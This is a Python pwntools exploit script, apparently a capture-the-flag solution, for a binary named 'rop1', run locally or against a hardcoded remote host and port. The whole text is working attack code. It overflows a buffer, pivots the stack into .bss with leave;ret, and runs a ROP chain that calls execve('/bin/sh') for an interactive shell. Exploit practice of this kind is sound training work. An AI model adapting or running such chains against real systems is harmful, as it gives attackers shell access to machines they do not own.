#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './rop1'
LIBC = ''
HOST = '140.110.112.77'
PORT = 3122 

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

pop_rdx_pop_rsi_ret = 0x0000000000442909
pop_rdi_ret = 0x0000000000401516
pop_rax_pop_rdx_pop_rbx_ret = 0x0000000000478616
pop_rsi_ret = 0x0000000000401637
syscall = 0x00000000004003da
binsh = 0x6CCD60
bss = 0x6cbfd0
leave_ret = 0x00000000004009e4

r.send(b"/bin/sh\x00")

ROP1 = flat(
    pop_rsi_ret,
    bss+8,
    0x0000000000400a16,
)

ROP2 = flat(
    pop_rax_pop_rdx_pop_rbx_ret,
    0x3b,
    0,
    0,
    pop_rsi_ret,
    0,
    pop_rdi_ret,
    binsh,
    syscall
)

r.sendafter('input_size', b'A'*0x20 + p64(bss) + ROP1)
r.sendafter('input_size', ROP2)
r.sendafter('input_size', b'A'*0x20 + p64(bss) + p64(leave_ret))
r.interactive()
